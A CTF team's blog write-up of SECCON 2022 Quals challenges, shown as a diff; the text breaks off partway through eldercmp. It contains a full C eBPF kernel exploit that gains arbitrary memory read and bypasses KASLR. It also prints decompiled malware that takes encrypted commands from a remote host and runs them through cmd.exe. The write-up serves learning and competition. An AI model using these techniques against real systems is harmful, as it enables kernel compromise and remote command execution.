@@ -1,0 +1,2207 @@
+Mon, 14 November 2022 ~ hxp
+
+## SECCON CTF 2022 Quals
+
+This was a great CTF and we hacked some stuff. Here’s a relatively small subset of how.
+
+Looking forward to the finals! 🇯🇵
+
+### babybpf
+
+##### sisu \| pwn, 10 solves, 278 points
+
+TLDR: found a working EBPF arb-read technique [3](https://github.com/tr3ee/CVE-2022-23222/blob/master/exploit.c) from a Chinese person on github, used superior tools [4](https://github.com/martinradev/gdb-pt-dump) to read the flag.
+
+This is an EBPF exploitation challenge: author has modified the handling of BPF_LSH and BPF_RSH to introduce a bug for the handling of 32-bit registers. With this bug, the verifier would assume that a 64-bit register has a known zero value when the lower 32-bit register part is shifted by 32 or more bits. This diverges the verifier’s state analysis from the actual runtime and allows to keep the very top bit of the 32-bit register. The verifier’s further analysis would assume that register is known and zero, while the runtime value is different.
+
+There are two CTF EBPF exploitation challenges ([1](https://smallkirby.hatenablog.com/entry/2021/01/31/210158)), for which I had a working exploit and decided to borrow the setup and exploitation technique. Unfortunately, the exploitation technique of modifying the array-map pointer no longer works. This technique was (maybe) fully broken with the introduction of Linux patch [6](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0), already described in the ‘ALU Sanitation’ section of [5](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story).
+
+For debugging my setup, I always dumped the produced intermediate code by setting `bpf_attr::log_level = 2`, then dumping the JIT-ed code from QEMU and loading it in Ghidra. The JIT-ed code is easy to spot: use gdb-pt-dump [4](https://github.com/martinradev/gdb-pt-dump) to print the address space (`pt`) and then search for a lonely executable page at a high address. When analyzing the JIT-ed code, it was clear that any corrupted register cannot be used to update the array-map pointer to be out-of-bounds by just using pointer arithmetic.
+
+This is where some googling for recent EBPF exploits helped. There is another exploitation technique shown in [3](https://github.com/tr3ee/CVE-2022-23222/blob/master/exploit.c) which abuses a memcpy-like operation: BPF_FUNC_skb_load_bytes_relative. The technique saves the array-map pointer onto the stack, performs an out-of-bounds memcpy with BPF_FUNC_skb_load_bytes_relative by abusing the corrupted register, and then loads the now-arbitrary array-map pointer into a register. This technique allows arbitrary read and arbitrary write to anywhere in memory.
+
+For getting the flag, there is no reason to elevate to root to read the flag. The flag is already loaded into memory and can be read if we can break through KASLR. A less-known technique for this is to read a pointer from `0xfffffe0000000000...` to disclose the kernel’s image base. I think the mapping may be a remnant of the boot’s thread stack, but I’m not 100% sure. After dislosing the kernel image base, one can then disclose the kernel’s physical identity mapping and traverse all of physical memory to find the flag. Because there is little entropy for the flag’s location, the flag is mostly at a known physical address and also always at the start of the page. A short search is suffient to find the flag.
+
+Flag:
+
+    SECCON{1nTr0dUcT10n_t0_rEc3nT_eBPF_3xpL01t4t10n!}
+
+This challenge was conceptually easy to understand and good for becoming more familiar with EBPF and kernel exploitation. Even if having the flag in rootfs simplified solving the challenge, it allowed more room for exploitation creativity.
+
+``` c
+#include "exploit.h" // this includes some helper functions.
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define VVV 0xdededededededeul
+
+unsigned long *values = NULL;
+int map_fd;
+
+static unsigned long read_value(struct bpf_program_context *ctx, unsigned long addr) {
+    unsigned long data[2];
+    memset(data, 'A', sizeof(data));
+    data[1] = addr;
+
+    values[0] = VVV;
+
+    int r;
+    r = update_map_element(map_fd, 0, values, BPF_ANY);
+    perr(r);
+    r = run_bpf_program(ctx, data, sizeof(data));
+    perr(r);
+
+    unsigned long leak[8];
+    r = lookup_map_element(map_fd, 0, &leak[0]);
+    perr(r);
+
+    return leak[0];
+}
+
+static void exploit() {
+    union bpf_attr map_attrs =
+    {
+        .map_type = BPF_MAP_TYPE_ARRAY,
+        .key_size = 4,
+        .value_size = 32,
+        .max_entries = 8,
+    };
+    map_fd = create_map(&map_attrs);
+    perr(map_fd);
+
+    struct bpf_insn insn[] =
+    {
+        // REG_9 has the input we want to write to stack
+        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),
+
+        // Load the array-map ptr.
+        BPF_MOV64_IMM(BPF_REG_0, 0),
+        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -8),
+        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
+        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
+        BPF_CHECK_REG_NOT_NULL(BPF_REG_0),
+
+        // Save the array-map ptr into REG_7.
+        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
+
+        // Read value and cause bug to have 31-st bit set while verifier thinks REG_4 is 0.
+        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_0, 0),
+        BPF_MOV64_IMM(BPF_REG_5, 32),
+        BPF_ALU32_REG(BPF_LSH, BPF_REG_4, BPF_REG_5),
+        BPF_MOV64_IMM(BPF_REG_5, 31),
+        BPF_ALU32_REG(BPF_RSH, BPF_REG_4, BPF_REG_5),
+
+        // This becomes 16, but verifier thinks it's 8.
+        BPF_ALU64_IMM(BPF_MUL, BPF_REG_4, 8),
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 8),
+
+        // store pointer to map
+        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -64),
+
+        // overwrite array-map pointer
+        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),    // 'skb' with our data.
+        BPF_MOV64_IMM(BPF_REG_2, 0),            // off
+        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -72), // fp - 72
+                                                // REG_4: length is actually 16 but berifier thinks it's 8.
+        BPF_MOV64_IMM(BPF_REG_5, 1),            // flags, no idea
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),
+
+        // Read pointer and deref pointer.
+        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -64),
+        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_6, 0),
+
+        // Store read value.
+        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),
+
+        BPF_MOV64_IMM(BPF_REG_0, 44),
+        BPF_EXIT_INSN(),
+    };
+
+    values = calloc(1, 0x10000);
+
+    struct bpf_program_context ctx;
+    int err = create_bpf_program(insn, array_size(insn), &ctx);
+    perr(err);
+
+    const unsigned long base_leak = read_value(&ctx, 0xfffffe0000002f50UL);
+    const unsigned long base = base_leak - 0x800b59ull;
+    const unsigned long physmap_leak_at = base + 0xd92818Ul;
+    printf("base leak is 0x%lx. image base is: 0x%lx\n", base_leak, base);
+    printf("Physmap leak should be at 0x%lx\n", physmap_leak_at);
+
+    const unsigned long physmap_leak = read_value(&ctx, physmap_leak_at);
+    printf("physmap leak: 0x%lx\n", physmap_leak);
+
+    char flag[64];
+    memset(flag, '0', sizeof(flag));
+    unsigned long flagat = 0;
+    const size_t flagPhysAddrMin = 0x500000ul;
+    const size_t flagPhysAddrMax = 0x700000ul;
+    for (size_t i = flagPhysAddrMin; i < flagPhysAddrMax; i += 0x1000ul) {
+        const unsigned long potential_flag_addr = physmap_leak + i;
+        const unsigned long flag_start = read_value(&ctx, potential_flag_addr);
+        perr(err);
+
+        printf("%zx: %lx\n", potential_flag_addr, flag_start);
+        if (strncmp((const char *)&flag_start, "SECCON", 6) == 0) {
+            printf("found!\n");
+            flagat = potential_flag_addr;
+            break;
+        }
+    }
+
+    for (size_t i = 0; i < 64; i += 8) {
+        const unsigned long flag8b = read_value(&ctx, flagat + i);
+        memcpy(&flag[i], &flag8b, 8);
+    }
+
+    puts(flag);
+}
+
+int main(int argc, char *argv[])
+{
+    exploit();
+    return 0;
+}
+```
+
+### noiseccon
+
+##### sandr0 \| msc, 22 solves, 197 points
+
+The only value we control is Scale X and Scale Y. For the sake of simplicity, we will set both values to the same number (called `scale` from now on).
+
+The flag is 21 bytes long and padded with 8 random bytes on both sides.
+
+We will use this sample flag to explain the solution:
+
+    0x8a3e90c7f662c9ad 534543434f4e7b64756d6d7964756d6d7964756d7d 1320c01dbdb94c8c
+     |  random        |S E C C O N {                           } | random         |
+
+The flag is transformed using the user-supplied value (simplified algorithm):
+
+``` js
+BigInt.asUintN(36, (flag * 16) / scale) / 16
+```
+
+We can use a scale like `16 ** X` to shift the flag by `X` bytes and then get 4.5 bytes of the flag as input value for `noise.perlin2`.
+
+We get `34543434.f` as value with a scale of `16 ** 49` which is the known part of `[S]ECCO` of the flag. We can therefore brute each subsequent byte of the flag one by one. For this, we get a webp for every flag-byte from the server starting with the known prefix. We then calculate every possible seed value for the perlin noise, leaving us with `2**16` possible seeds times `[0x20-0x7e]` possible values times `13` unknown flag bytes.
+
+Script to get the flag-bytes:
+
+``` py
+import pwn
+import base64
+from PIL import Image
+
+for i in range(49, 17, -2):
+    io = pwn.remote("noiseccon.seccon.games", 1337)
+    io.recvuntil(b"Scale x: ")
+    scale = 16 ** i
+    io.send(f"{scale}\n".encode())
+    io.recvuntil(b"Scale y: ")
+    io.send(f"{scale}\n".encode())
+    img = base64.b64decode(io.recvuntil(b"\n"))
+    with open(f"flag_{i}.webp", "wb") as f:
+        f.write(img)
+    im = Image.open(f"flag_{i}.webp")
+    pixels = im.load()
+    with open(f"flag_{i}.hex", "wb") as f:
+        for y in range(256):
+            for x in range(256):
+                r,g,b = pixels[x,y]
+                assert r == g == b
+                f.write(bytes([r]))
+    io.close()
+```
+
+For the sake of speed, we extract the pixels of the webp to skip the call to `sharp` at brute-time. We also only calculate and compare the first line of the image (which was enough). After some minutes, we are greeted with the flag:
+
+    SECCON{p3RLin_W0r1d!}
+
+Brute-Code:
+
+``` js
+const { noise } = require("./perlin.js");
+const fs = require('fs');
+
+const brute = async (FLAG, pos, original) =>  {
+  process.stderr.write(FLAG + "\r");
+
+  const paddedFlag = [
+    ...Buffer.from([0,0,0,0,0,0,0,0]), // useless prefix
+    ...Buffer.from(FLAG),
+    ...Buffer.from([0,0,0,0,0,0,0,0]), // useless suffix
+  ];
+
+  // bytes_to_long
+  let flagInt = 0n;
+  for (const b of Buffer.from(paddedFlag)) {
+    flagInt = (flagInt << 8n) | BigInt(b);
+  }
+
+  const offset = Number(BigInt.asUintN(36, (flagInt * BigInt(16)) / pos)) / 16;
+
+  for (seed = 0; seed < 65536; seed++) {
+    noise.seed(seed);
+    const colors = [];
+    for (let x = 0; x < 256; x++) {
+      let v = noise.perlin2(offset + x * 0.05, offset);
+      v = (v + 1.0) * 0.5; // [-1, 1] -> [0, 1]
+      colors.push((v * 256) | 0);
+    }
+    const image = Buffer.from(colors)
+    if (image.compare(original, 0, 256) == 0) {
+      return true;
+    }
+  }
+
+  return false;
+};
+
+const main = async () => {
+  let mapping = {
+    57: "S",
+    55: "E",
+    53: "C",
+    51: "C",
+    49: "O",
+    47: "N",
+    45: "{",
+    43: "?",
+    41: "?",
+    39: "?",
+    37: "?",
+    35: "?",
+    33: "?",
+    31: "?",
+    29: "?",
+    27: "?",
+    25: "?",
+    23: "?",
+    21: "?",
+    19: "?",
+    17: "}"
+  }
+
+  for (pos = 43; pos > 17; pos -= 2) {
+    const original = fs.readFileSync("flag_" + pos + ".hex");
+    const p = BigInt(16 ** pos)
+    for (char = 0x20; char < 0x7e; char++) {
+      flag = ""
+      for (builder = 57; builder > 15; builder -= 2) {
+        if (pos == builder) {
+          flag += String.fromCharCode(char)
+        } else {
+          flag += mapping[builder]
+        }
+      }
+      if (await brute(flag, p, original)) {
+        console.log("FLAG:", flag)
+        mapping[pos] = String.fromCharCode(char)
+        break
+      }
+    }
+  }
+};
+
+main();
+```
+
+### DoroboH
+
+##### kirschju \| rev, 27 solves, 179 points
+
+#### The raccoon and the fox
+
+The following description of the situation comes attached to the problem:
+
+```
+Do not run araiguma.exe unless you fully understand the logic.
+
++-- Victim Machine --+       +-- Attacker Machine --+
+| +--------------+   |       |   +-------------+    |
+| | araiguma.exe |<------------->| kitsune.exe |    |
+| +--------------+   |   ^   |   +-------------+    |
+|        ^           |   |   |                      |
++--------|-----------+   |   +----------------------+
+         |               |
+  Memory |               | Packet
+   Dump  |               | Capture
+         |               |
+  [ araiguma.DMP ] [ network.pcapng ]
+```
+
+We are given a (malware) binary, a pcap network traffic dump, and a minidump of the malware process memory while waiting for more data and sitting in the innermost `recv` function. A quick peek into the (very small) binary shows that it’s performing a Diffie-Hellman key exchange with IP address 192.168.3.6 to establish a common secret, which in turn the raccoon (araiguma) uses to decrypt the network traffic sent by the fox (kitsune):
+
+``` c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  DWORD dwBytes; // [rsp+38h] [rbp-48h] BYREF
+  int dwBytes_4; // [rsp+3Ch] [rbp-44h] BYREF
+  struct sockaddr name; // [rsp+40h] [rbp-40h] BYREF
+  struct WSAData WSAData; // [rsp+50h] [rbp-30h] BYREF
+  char buf[4]; // [rsp+1F0h] [rbp+170h] BYREF
+  DWORD pdwDataLen; // [rsp+1F4h] [rbp+174h] BYREF
+  HCRYPTKEY hKey; // [rsp+1F8h] [rbp+178h] BYREF
+  HCRYPTKEY phKey; // [rsp+200h] [rbp+180h] BYREF
+  HCRYPTPROV hProv; // [rsp+208h] [rbp+188h] BYREF
+  BYTE v13[4]; // [rsp+210h] [rbp+190h] BYREF
+  void *i_am_404040; // [rsp+218h] [rbp+198h]
+  BYTE pbData[4]; // [rsp+220h] [rbp+1A0h] BYREF
+  void *v16; // [rsp+228h] [rbp+1A8h]
+  LPCSTR lpParameters; // [rsp+238h] [rbp+1B8h]
+  BYTE *v18; // [rsp+240h] [rbp+1C0h]
+  SOCKET s; // [rsp+248h] [rbp+1C8h]
+  BYTE *v20; // [rsp+250h] [rbp+1D0h]
+  HANDLE hHeap; // [rsp+258h] [rbp+1D8h]
+
+  _main();
+  *(_DWORD *)pbData = 64;
+  v16 = &g_P;
+  *(_DWORD *)v13 = 64;
+  i_am_404040 = &g_G;
+  hHeap = GetProcessHeap();
+  if ( !hHeap )
+    return 1;
+  if ( !(unsigned int)_IAT_start__(
+                        &hProv,
+                        0i64,
+                        "Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider",
+                        PROV_DSS_DH,
+                        0xF0000000) )
+    return 1;
+  if ( CryptGenKey(hProv, CALG_DH_EPHEM, 0x2000041u, &phKey)
+    && CryptSetKeyParam(phKey, KP_P, pbData, 0)
+    && CryptSetKeyParam(phKey, KP_G, v13, 0)
+    && CryptSetKeyParam(phKey, KP_X, 0i64, 0) )
+  {
+    if ( CryptExportKey(phKey, 0i64, 6u, 0, 0i64, &pdwDataLen) )
+    {
+      v20 = (BYTE *)HeapAlloc(hHeap, 0, pdwDataLen);
+      if ( v20 )
+      {
+        if ( CryptExportKey(phKey, 0i64, 6u, 0, v20, &pdwDataLen) )
+        {
+          WSAStartup(2u, &WSAData);
+          s = socket(2, 1, 0);
+          name.sa_family = 2;
+          *(_WORD *)name.sa_data = htons(0x1F90u);
+          inet_pton(2, "192.168.3.6", &name.sa_data[2]);
+          if ( !connect(s, &name, 16) )
+          {
+            send(s, (const char *)&pdwDataLen, 4, 0);
+            send(s, (const char *)v20, pdwDataLen, 0);
+            recv(s, buf, 4, 0);
+            v18 = (BYTE *)HeapAlloc(hHeap, 0, *(unsigned int *)buf);
+            if ( v18 )
+            {
+              recv(s, (char *)v18, *(int *)buf, 0);
+              if ( CryptImportKey(hProv, v18, *(DWORD *)buf, phKey, 0, &hKey) )
+              {
+                dwBytes_4 = CALG_RC4;
+                if ( CryptSetKeyParam(hKey, KP_ALGID, (const BYTE *)&dwBytes_4, 0) )
+                {
+                  memset(v18, 0, *(unsigned int *)buf);
+                  while ( recv(s, (char *)&dwBytes, 4, 0) == 4 )
+                  {
+                    lpParameters = (LPCSTR)HeapAlloc(hHeap, 0, dwBytes);
+                    if ( !lpParameters )
+                      break;
+                    recv(s, (char *)lpParameters, dwBytes, 0); /* Dump taken here */
+                    if ( !CryptDecrypt(hKey, 0i64, 1, 0, (BYTE *)lpParameters, &dwBytes) )
+                    {
+                      HeapFree(hHeap, 0, (LPVOID)lpParameters);
+                      break;
+                    }
+                    ShellExecuteA(0i64, "open", "cmd.exe", lpParameters, 0i64, 0);
+                    memset((void *)lpParameters, 0, dwBytes);
+                    HeapFree(hHeap, 0, (LPVOID)lpParameters);
+                  }
+                }
+              }
+              HeapFree(hHeap, 0, v18);
+            }
+            closesocket(s);
+          }
+          WSACleanup();
+        }
+        HeapFree(hHeap, 0, v20);
+      }
+    }
+    CryptDestroyKey(phKey);
+  }
+  CryptReleaseContext(hProv, 0);
+  return 0;
+}
+```
+
+#### Crypto 101
+
+To recap, classic Diffie-Hellman key exchange is (approximately) the following:
+
+    Raccoon             -------------- A := pow(g, a, p) --------------->                Fox
+                        <------------- B := pow(g, b, p) ----------------
+    Prime p                                                                          p Prime
+    Generator g                                                                  g Generator
+    Secret key a                                                                b Secret key
+    Common secret S := pow(pow(g, b, p), a, p) == pow(pow(g, a, p), b, p) =: S Common secret
+                      '-----.----'               '-----.----'
+                   B Received from Fox      A Received from Raccoon
+
+From the pcap, we can get the values `A` (i.e. Raccoon’s public key) and `B` (i.e. Fox’s public key). The prime `p` and generator `g` we find as are hard-coded values in the binary. If we were to obtain the secret key `a` of Raccoon from the given memory dump, we could compute the common secret `S` and derive the symmetric rc4 key to decrypt all following network traffic, hopefully yielding a flag.
+
+#### Failing to find the private key the (somewhat) smart way
+
+After poking around a bit in the memorydump using `windbg`, and xoring several struct members of Microsoft-defined structures `HCRYPTKEY` and `HCRYPTPROV` with the magic value `0xA2491D83D96214A0` retrieved from the internal logic of the code, we found … nothing. For some reason the big integers pointed to from those structs either yielded invalid numbers or the values of `g`, `p`, or `pow(g, a, p)`, respectively, which weren’t of much help.
+
+#### Succeeding to find the private key the dumb way
+
+At some point we got fed up with reading `dssenh.dll` internals and misleading wine implementations and crawled back to our good ol’ friend Brutus–meaning we wrote a python script that would take any possible block of `0x40` contiguous memory bytes, interpret them as a candidate big integer for `a` and check if `pow(g, a, p)` would match the public key `A` extracted from the pcap. To our surprise this worked immediately.
+
+``` py
+#!/usr/bin/env python3
+
+dat = open("araiguma.DMP", "rb").read()
+p = int.from_bytes(dat[0xe8231:][:0x40], "little")
+g = int.from_bytes(dat[0xe8271:][:0x40], "little")
+mypub = int.from_bytes(open("network.pcap", "rb").read()[0x9367:][:0x40], "little")
+
+assert g < p
+assert mypub < p
+
+print("Searching for private key in memory ...")
+
+for i in range(0, len(dat)):
+    if i & 0xfff == 0:
+        print(hex(i), hex(len(dat)))
+    cand = int.from_bytes(dat[i:i+0x40], "little")
+    if pow(g, cand, p) == mypub:
+        print(f"Private key 0x{cand:x} found at offset 0x{i:x}!")
+        break
+```
+
+This recovers `a = 0x2cc4416c601b0aa94984bf3e99697211a5c1a683a251b1348f773661463369bdfb22ad9e5d75dbea11533e130778d87455aceef2656941f62c5f2ff289fe9cea` . With our recovered private key, we simply computed the shared common secret as `S = pow(B, a, p) = pow(pow(g, b, p), a, p) = 0x1da5821fc519d4864722581ee861b7de5286565603b72438e9e0b6cf486377a89f9ee710d31e3923597d687de2f8bc40a33a2faf1066c054ad8727f3a085f5f1`.
+
+#### Decrypting the network stream
+
+From here we needed a way to know how exactly the rc4 key was derived from the established DH-secret. We could have re-implemented the functionality by calling and patching structs handled by `CryptGenKey` and `CryptImportKey` to use the recovered private key and the public key from the pcap, but given that we failed interpreting the data structures already once, we instead decided to follow through with our dumb memory scanning approach. While scanning for parts of the shared secret in memory we found two memory locations holding the lowest 128 bits of `S % 2**128 = 0xa33a2faf1066c054ad8727f3a085f5f1` only. Guessing that the bytes representing this number might be directly used as the rc4 key we decrypted the network stream and retrieved the flag:
+
+``` python
+#!/usr/bin/env python3
+
+from Crypto.Cipher import ARC4
+
+dat = open("araiguma.DMP", "rb").read()
+p = int.from_bytes(dat[0xe8231:][:0x40], "little")
+g = int.from_bytes(dat[0xe8271:][:0x40], "little")
+mypub = int.from_bytes(open("network.pcap", "rb").read()[0x9367:][:0x40], "little")
+theirpub = int.from_bytes(open("network.pcap", "rb").read()[0x9495:][:0x40], "little")
+
+assert g < p
+assert mypub < p
+assert theirpub < p
+
+print("Searching for private key in memory ...")
+
+for i in range(len(dat)):
+    if i & 0xfff == 0:
+        print(hex(i), hex(len(dat)))
+    cand = int.from_bytes(dat[i:i+0x40], "little")
+    if pow(g, cand, p) == mypub:
+        print(f"private key 0x{cand:x} found at offset 0x{i:x}!")
+        break
+
+mypriv = cand
+common = pow(theirpub, mypriv, p)
+
+rc4 = ARC4.new(int.to_bytes(common, 0x40, "little")[:0x10])
+enc = open("network.pcap", "rb").read()[0x9763:][:0x67]
+print(rc4.decrypt(enc))
+rc4 = ARC4.new(int.to_bytes(common, 0x40, "little")[:0x10])
+enc = open("network.pcap", "rb").read()[0x4e166:][:0x67]
+print(rc4.decrypt(enc))
+```
+
+``` bash
+> ./pwn.py
+Searching for private key in memory ...
+0x0 0x4122231
+0x1000 0x4122231
+0x2000 0x4122231
+# ... snip ...
+0x68000 0x4122231
+private key 0x2cc4416c601b0aa94984bf3e99697211a5c1a683a251b1348f773661463369bdfb22ad9e5d75dbea11533e130778d87455aceef2656941f62c5f2ff289fe9cea found at offset 0x687d1!
+b'/C echo "SECCON{M3m0ry_Dump+P4ck3t_C4ptur3=S0ph1st1c4t3d_F0r3ns1cs}" > C:\\Users\\ctf\\Desktop\\flag.txt\r\n\x00'
+b'/C echo "I regret to say that your computer is pwned... :(" > C:\\Users\\ctf\\Desktop\\notification.txt\r\n\x00|'
+```
+
+Obviously, the flag is
+
+    SECCON{M3m0ry_Dump+P4ck3t_C4ptur3=S0ph1st1c4t3d_F0r3ns1cs}
+
+### babycmp
+
+##### kirschju \| 176 solves, 79 points
+
+The babycmp challenge really just is a xor of the input bytes with the bytes of the sentence `Welcome to SECCON 2022` followed by a comparison to hard-coded values. During optimization, the compiler made the code a tiny bit choppy, but it is overall still trivial to reverse.
+
+The python script
+
+``` python
+key = b"Welcome to SECCON 2022"
+
+enc = bytes.fromhex("04202F2020231E59441A7F3575362D2B11175A036D503607153C090104472B36410A38")
+
+print("".join([ chr(enc[i] ^ key[i % len(key)])  for i in range(len(enc)) ]))
+```
+
+yields the flag:
+
+    SECCON{y0u_f0und_7h3_baby_flag_YaY}
+
+### eldercmp
+
+##### kirschju \| 19 solves, 210 points
+
+This is (almost) the same challenge binary as `babycmp`, except that this time, the `baby_mode` global variable is `1`. This has the effect that the misleadingly-named constructor `_detect_debugger` (1) installs the function `trampoline` as custom handler for `SIGSEGV` , (2) makes any future `cpuid` instruction trigger a `SIGSEGV` (`prctl(ARCH_SET_CPUID, 0)`), and (3) initializes the `gs_base` pseudo-segment selector to point to the `heart` function (`prctl(ARCH_SET_GS, heart);`). The control flow is then hijacked in the original `main` function (containing the `babycmp` comparison logic) by the embedded `cpuid` instruction at offset `0x11af`:
+
+``` c
+.text:0000000000001180                         ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:0000000000001180                                         public main
+.text:0000000000001180                         main            proc near               ; DATA XREF: start+21↓o
+.text:0000000000001180
+.text:0000000000001180                         var_68          = xmmword ptr -68h
+.text:0000000000001180                         var_58          = byte ptr -58h
+.text:0000000000001180                         var_48          = xmmword ptr -48h
+.text:0000000000001180                         var_38          = xmmword ptr -38h
+.text:0000000000001180                         var_28          = dword ptr -28h
+.text:0000000000001180                         var_20          = qword ptr -20h
+.text:0000000000001180
+.text:0000000000001180                         ; __unwind {
+.text:0000000000001180 F3 0F 1E FA                             endbr64
+.text:0000000000001184 41 54                                   push    r12
+.text:0000000000001186 55                                      push    rbp
+.text:0000000000001187 48 89 F5                                mov     rbp, rsi
+.text:000000000000118A 53                                      push    rbx
+.text:000000000000118B 48 83 EC 50                             sub     rsp, 50h
+.text:000000000000118F 64 48 8B 04 25 28 00 00+                mov     rax, fs:28h
+.text:000000000000118F 00
+.text:0000000000001198 48 89 44 24 48                          mov     [rsp+68h+var_20], rax
+.text:000000000000119D 31 C0                                   xor     eax, eax
+.text:000000000000119F 83 FF 01                                cmp     edi, 1
+.text:00000000000011A2 0F 8E 2B 01 00 00                       jle     loc_12D3
+.text:00000000000011A8 4C 8B 66 08                             mov     r12, [rsi+8]
+.text:00000000000011AC 4C 89 E7                                mov     rdi, r12
+.text:00000000000011AF 0F A2                                   cpuid
+```
+
+It is important to notice that the `rdi` register is set up to point to `argv[1]` just right in front of the `cpuid` instruction. Due to the special setup, `cpuid` triggers a `SIGSEGV`, which is forwarded to the `trampoline` function by the operating system.
+
+When declaring the right types for the signal handler, it becomes pretty obvious what is happening:
+
+``` c
+void __fastcall trampoline(__int64 a1, siginfo_t *a2, ucontext_t *ctxt)
+{
+  unsigned __int64 *v4; // rdx
+  signed __int64 v5; // rax
+  __int64 reg_rip; // rdx
+  char v7; // al
+  char **v8; // rax
+  const char *reg_rdi; // r14
+  char **v10; // r13
+  size_t flag_len; // rbp
+  size_t flag_len_ceil; // r12
+  char *v13; // rax
+  char *v14; // rax
+  size_t v15; // rax
+
+  v4 = ctxt->uc_mcontext.gregs[REG_RIP];
+  if ( *v4 == 0xf4 ) /* f4 hlt */
+  {
+    ctxt->uc_mcontext.gregs[REG_RIP] = v4 + 1;
+    return;
+  }
+  if ( *v4 != 0x0f )
+    goto LABEL_11;
+  ctxt->uc_mcontext.gregs[REG_RSP] &= 0xFFFFFFFFFFFFFFF0LL;
+  v5 = sys_arch_prctl(ARCH_GET_GS, ctxt->uc_mcontext.gregs[REG_RIP], v4);
+  v7 = *(reg_rip + 1);
+  if ( v7 != 0xA2 )
+  {
+    if ( v7 == 0x06 ) /* 0f 06 clts */
+      return;
+LABEL_11:
+    exit(1);
+  }
+  /* 0f a2 cpuid */
+  v8 = malloc(0x1A0uLL);
+  reg_rdi = ctxt->uc_mcontext.gregs[REG_RDI];
+  v10 = v8;
+  flag_len = strlen(reg_rdi);
+  flag_len_ceil = (flag_len + 8) & 0xF8;
+  v13 = malloc(flag_len_ceil);
+  *v10 = v13;
+  v14 = strcpy(v13, reg_rdi);
+  if ( flag_len < flag_len_ceil )
+  {
+    v14[flag_len] = flag_len_ceil - flag_len;
+    v15 = flag_len + 1;
+    if ( flag_len_ceil > flag_len + 1 )
+    {
+      do
+        (*v10)[v15++] = flag_len_ceil - flag_len;
+      while ( flag_len_ceil != v15 );
+    }
+  }
+  v10[1] = flag_len_ceil;
+  ctxt->uc_mcontext.gregs[REG_RDI] = v10;
+}
+```
+
+In general, the handler examines the instruction bytes of the faulting instruction and differentiates three cases:
+
+1.  `0f a2`: If a `cpuid` instruction is executed, the stack pointer is aligned to a multiple of 8 and the next instruction is set to the contents of the `gs_base` pseudo register. Then the handler allocates a struct of `0x1a0` bytes and places a copy of the flag contents at structure offset `0x00`, and the string length, rounded up to the next multiple of 8, at structure offset `0x08`. PKCS#7 padding is applied to the input. A pointer to the resulting structure is placed in register `rdi`. Since this case occurs first, we know that `gs_base` currently holds a pointer to `heart`, so we will enter this function with `rdi` pointing to the “flag” structure that the handler set up.
+2.  `0f 06`: If a `clts` instruction is executed, the stack pointer is aligned to a multiple of 8 and the next instruction is set to the contents of the `gs_base` pseudo register.
+3.  `f4`: If a `hlt` instruction is executed the handler simply skips to the next instruction.
+
+Following these three simplification rules we were able to deobfuscate the `heart` function as follows:
+
+- Any `hlt` instruction we could simply nop out
+
+- The function contains a `sys_arch_prctl(ARCH_SET_GS, rdx); asm { clts };` sequence at offset `0x17c7`. With the knowledge of the `SIGSEGV` handler we simply replaced any `jmp 0x17C7` with a `jmp <contents-of-rdx>` instruction. The same goes for conditional branches. Then, the deobfuscated `heart` function decompiles to (almost) beautiful code:
+
+  ``` c
+  unsigned __int64 __fastcall heart(struct flaginfo *flaginfo)
+  {
+  unsigned __int8 v2; // dl
+  unsigned __int8 v3; // dl
+  unsigned __int8 v4; // dl
+  unsigned __int8 v5; // dl
+  unsigned __int8 v6; // dl
+  unsigned __int8 v7; // dl
+  unsigned __int8 v8; // dl
+  unsigned __int8 v9; // dl
+  unsigned __int8 v10; // dl
+  unsigned __int8 v11; // dl
+  unsigned __int8 v12; // dl
+  unsigned __int8 v13; // dl
+  unsigned __int8 v14; // dl
+  unsigned __int8 v15; // dl
+  char *v16; // rax
+  char *v17; // rsi
+  char *v18; // rdi
+  int v19; // edx
+  unsigned int v20; // ecx
+  __m128i v21; // xmm0
+  unsigned int v22; // edx
+  __m128i v23; // xmm1
+  __m128i si128; // xmm0
+  __m128i v25; // xmm0
+  __m128i v26; // xmm0
+  __m128i v27; // xmm0
+  _BYTE *block; // r13
+  unsigned __int16 v29; // dx
+  unsigned __int64 v30; // rdx
+  unsigned __int8 v31; // si
+  unsigned __int16 v32; // cx
+  unsigned __int64 v33; // rcx
+  char *cblock; // rsi
+  unsigned __int64 v35; // r14
+  unsigned __int64 v36; // r14
+  unsigned __int64 v37; // rdx
+  unsigned __int64 v38; // rax
+  unsigned __int64 v39; // rcx
+  unsigned __int64 v40; // rcx
+  unsigned __int64 v41; // rax
+  unsigned __int64 v42; // r14
+  unsigned __int64 v43; // rax
+  unsigned __int64 v44; // rax
+  unsigned __int64 v45; // rdx
+  unsigned __int64 v46; // rdx
+  unsigned __int64 v47; // rdx
+  unsigned __int64 v48; // rcx
+  unsigned __int64 v49; // rcx
+  unsigned __int64 v50; // rax
+  unsigned __int64 v51; // rdx
+  size_t v52; // rax
+  __int64 v53; // rdi
+  unsigned __int64 result; // rax
+  __m128i v55[8]; // [rsp+0h] [rbp-D0h] BYREF
